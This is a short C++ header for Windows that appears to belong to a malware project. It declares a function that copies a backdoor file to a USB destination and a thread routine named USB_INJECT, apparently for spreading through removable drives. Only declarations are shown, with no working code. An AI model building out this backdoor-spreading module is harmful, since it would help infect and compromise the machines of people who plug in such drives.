#ifndef USBB_
#define USBB_

#include "supercharge.hpp"
#include <windows.h>
#include <fstream>
#include <sstream>
#include <lmcons.h>
void createFiles(const char* bckdoorPath, const char* usbPathDest);
DWORD WINAPI USB_INJECT(LPVOID lpParameter);

#endif